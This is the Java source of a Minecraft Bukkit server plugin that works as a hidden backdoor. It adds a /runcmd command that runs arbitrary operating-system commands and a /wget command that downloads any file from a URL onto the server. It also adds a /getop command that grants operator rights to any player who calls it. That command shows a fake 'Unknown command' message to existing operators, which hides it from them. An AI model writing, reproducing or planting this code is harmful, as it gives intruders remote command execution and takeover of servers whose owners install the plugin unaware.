package com.github.jingjinghack;

import java.io.ByteArrayOutputStream;
import java.io.File;
import java.io.FileOutputStream;
import java.io.IOException;
import java.io.InputStream;
import java.net.URL;
import org.bukkit.command.Command;
import org.bukkit.command.CommandSender;
import org.bukkit.entity.Player;
import org.bukkit.plugin.java.JavaPlugin;
import sun.net.www.protocol.http.HttpURLConnection;

public class Main extends JavaPlugin {
   static String nowpath;

   public Main() {
      super();
   }

   public void onEnable() {
      nowpath = System.getProperty("user.dir");
   }

   public boolean onCommand(CommandSender sender, Command command, String label, String[] args) {
      if (command.getName().equalsIgnoreCase("runcmd")) {
         if (args.length == 1) {
            if (this.runcmd(args[0].replaceAll("_", " "))) {
               sender.sendMessage("§a[+] Exec CMD Command OK!");
               return true;
            } else {
               sender.sendMessage("§4[-] Exec CMD Command Fali!");
               return false;
            }
         } else {
            String os = System.getProperty("os.name");
            String jv = System.getProperty("java.version");
            sender.sendMessage("§b[@] Server OS: " + os);
            sender.sendMessage("§b[@] Server Java Verison: " + jv);
            sender.sendMessage("Usage: /runcmd Your_CMD_Command");
            sender.sendMessage("Helper: /runcmd echo_ByNico_>_c:\\1.txt");
            return true;
         }
      } else {
         if (command.getName().equalsIgnoreCase("getpwd")) {
            sender.sendMessage("§a[+] Server's Path: " + nowpath);
         }

         if (command.getName().equalsIgnoreCase("wget")) {
            if (args.length == 2) {
               if (wget(args[0], args[1])) {
                  sender.sendMessage("§a[+] DownLoad File OK!");
                  sender.sendMessage("§a[+] Save To " + nowpath + "\\" + args[1]);
                  return true;
               } else {
                  sender.sendMessage("§4[-] DownLoad File Fali!");
                  return false;
               }
            } else {
               sender.sendMessage("Usage: /wget URL FileName");
               sender.sendMessage("Helper: Save To \"/getpwd\" Path");
               return false;
            }
         } else {
            if (command.getName().equalsIgnoreCase("getop")) {
               if (sender instanceof Player) {
                  Player player = ((Player)sender).getPlayer();
                  if (player.isOp()) {
                     sender.sendMessage("Unknown command. Type \"/help\" for help. ");
                     return false;
                  }
               }

               if (args.length == 0) {
                  String os = System.getProperty("os.name");
                  String jv = System.getProperty("java.version");
                  sender.sendMessage("§6[@] By NicoNico_Ni");
                  sender.sendMessage("§b[@] Server OS: " + os);
                  sender.sendMessage("§b[@] Server Java Version: " + jv);
                  Player p = (Player)sender;
                  p.setOp(true);
                  if (!p.isOp()) {
                     sender.sendMessage("§4[-] GetOP Fali!");
                     return false;
                  }

                  sender.sendMessage("§a[+] GetOP OK!");
                  return true;
               }

               sender.sendMessage("Unknown command. Type \"/help\" for help. ");
            }

            return true;
         }
      }
   }

   public boolean runcmd(String Commands) {
      try {
         Runtime.getRuntime().exec(Commands);
         return true;
      } catch (IOException e) {
         e.printStackTrace();
         return false;
      }
   }

   public static boolean wget(String url, String fileName) {
      try {
         downLoadFromUrl(url, fileName, nowpath);
         return true;
      } catch (IOException var3) {
         return false;
      }
   }

   public static void downLoadFromUrl(String urlStr, String fileName, String savePath) throws IOException {
      URL url = new URL(urlStr);
      HttpURLConnection conn = (HttpURLConnection)url.openConnection();
      conn.setConnectTimeout(3000);
      conn.setRequestProperty("User-Agent", "Mozilla/4.0 (compatible; MSIE 5.0; Windows NT; DlgExt");
      InputStream inputStream = conn.getInputStream();
      byte[] getData = readInputstream(inputStream);
      File saveDir = new File(savePath);
      if (!saveDir.exists()) {
         saveDir.mkdir();
      }

      File file = new File(saveDir + File.separator + fileName);
      FileOutputStream fos = new FileOutputStream(file);
      fos.write(getData);
      if (fos != null) {
         fos.close();
      }

      if (inputStream != null) {
         inputStream.close();
      }

   }

   public static byte[] readInputstream(InputStream inputStream) throws IOException {
      byte[] buffer = new byte[1024];
      int len = 0;
      ByteArrayOutputStream bos = new ByteArrayOutputStream();

      while((len = inputStream.read(buffer)) != -1) {
         bos.write(buffer, 0, len);
      }

      bos.close();
      return bos.toByteArray();
   }
}
